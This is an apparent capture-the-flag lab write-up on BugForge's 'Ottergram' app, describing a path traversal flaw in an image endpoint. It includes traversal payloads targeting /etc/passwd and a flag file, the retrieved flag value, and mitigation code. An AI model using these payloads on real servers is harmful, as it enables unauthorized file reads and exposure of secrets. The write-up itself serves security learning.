---
title: "Path Traversal – Arbitrary File Read via Image Endpoint | Ottergram"
date: 2026-05-02 1:10:00 +0530
categories: [Web Security, File Inclusion]
tags: [path-traversal, lfi, arbitrary-file-read, bugforge, file-handling]
platform: BugForge
author: Shivansh Sharma
image:
  path: /assets/images/posts/ottergram-path-traversal.webp
  alt: Path Traversal in Ottergram image endpoint
---

## Overview

This lab demonstrates a **Path Traversal vulnerability** in the image-fetching functionality of the Ottergram application. By manipulating a file parameter, it was possible to access arbitrary files on the server.

The vulnerability ultimately allowed retrieval of sensitive data, including the lab flag.

---

## Objective

- Identify insecure file handling in the application
- Exploit path traversal to read arbitrary files
- Retrieve the flag from the server

---

## Reconnaissance

After registering and logging into the application, I began exploring its core functionality:

- Viewing posts
- Loading images
- Interacting with API endpoints via Burp Suite

While analyzing HTTP traffic, I observed the following request when an image was loaded:

```http
GET /api/post/image?file=/uploads/otter2.png HTTP/2
Host: lab-1777706071572-sut8kb.labs-app.bugforge.io
```

**Key Observation**

The application directly uses a `file` parameter to fetch images from the server.

This is a common entry point for:

- Path Traversal
- Local File Inclusion (LFI)
- Arbitrary file read vulnerabilities

---

## Exploitation

### Step 1: Testing for Path Traversal

To verify whether the parameter was vulnerable, I injected a traversal payload:

```http
GET /api/post/image?file=../../../../../etc/passwd HTTP/2
```

**Response**

```
HTTP/2 200 OK
Content-Type: text/plain

flag is somewhere else.
```

**Analysis**

This confirms:

- The application does not sanitize user input
- File paths are directly passed to the filesystem
- Directory traversal (`../`) is allowed
- Arbitrary file read is possible

---

### Step 2: Locating Sensitive Files

Since `/etc/passwd` worked, the next step was to locate the flag file.

Given typical lab setups, I tested traversal toward the application root:

```http
GET /api/post/image?file=../flag.txt HTTP/2
```

**Proof of Exploitation**

**Response**

```
HTTP/2 200 OK
Content-Type: text/plain

bug{y4g5FWArsHugH7hTJm2q44KTsy7nu52T}
```

The flag was successfully retrieved, confirming full exploitation.

---

## Root Cause

The vulnerability exists due to insecure file handling:

- User-controlled input is used directly in file operations
- No validation or sanitization is applied
- No restriction on directory traversal sequences (`../`)
- File access is not limited to a safe directory

---

## Impact

An attacker could:

- Read sensitive system files (`/etc/passwd`)
- Access application configuration files
- Retrieve environment variables or secrets
- Potentially expose source code
- Chain with other vulnerabilities for deeper compromise

---

## Mitigation

### 1. Input Validation

Reject any input containing:

- `../`
- Absolute paths
- Encoded traversal sequences

### 2. Use Allowlisting

Instead of accepting raw paths:

- Map file IDs → internal filenames
- Only allow predefined files

### 3. Enforce Directory Restrictions

Ensure file access is limited to a specific directory:

```javascript
const basePath = path.resolve("uploads");
const requestedPath = path.resolve(basePath, userInput);

if (!requestedPath.startsWith(basePath)) {
    throw new Error("Invalid file path");
}
```

### 4. Secure File Handling

- Avoid directly exposing filesystem paths
- Use safe abstractions for file access
- Implement proper error handling

---

## Real-World Insight

Path Traversal is often underestimated but can be extremely dangerous when combined with:

- Misconfigured servers
- Exposed secrets
- Weak access controls

In real-world applications, this can lead to:

- Credential leaks
- API key exposure
- Full application compromise

---

## Conclusion

This lab highlights how a simple oversight in file handling can lead to critical vulnerabilities.

By trusting user input in file operations, the application exposed its internal filesystem, allowing attackers to retrieve sensitive data with minimal effort.

Proper validation, access control, and secure design practices are essential to prevent such issues.